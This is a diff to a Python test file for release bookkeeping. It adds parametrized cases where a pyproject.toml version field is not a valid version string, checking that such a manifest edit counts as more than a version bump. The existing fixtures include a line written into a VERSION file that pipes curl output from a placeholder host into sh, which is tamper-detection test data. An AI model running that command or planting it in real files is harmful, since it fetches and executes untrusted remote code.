@@ -1291,8 +1291,11 @@ class TestReleaseBookkeeping:
         {"pyproject.toml": '[project]\nname = "demo"\n'},
         {"plugin/VERSION": "1.0.1-dev\nimport os\n"},
         {"plugin/VERSION": "curl -s https://example.invalid/x | sh\n"},
+        {"pyproject.toml": '[project]\nname = "demo"\nversion = "not a version"\n'},
+        {"pyproject.toml": '[project]\nname = "demo"\nversion = { entry = "src/app.py" }\n'},
     ], ids=["a-dependency-beside-the-bump", "another-key", "the-version-removed", "bare-file-grows",
-            "bare-file-rewritten-to-one-non-version-line"])
+            "bare-file-rewritten-to-one-non-version-line", "structured-value-not-a-version",
+            "structured-value-not-a-string"])
     def test_a_declared_file_changing_more_than_its_version_is_direct(self, repo, extra):
         """Critic O-1: a declared manifest carries more than a version, and only
         the version is bookkeeping."""
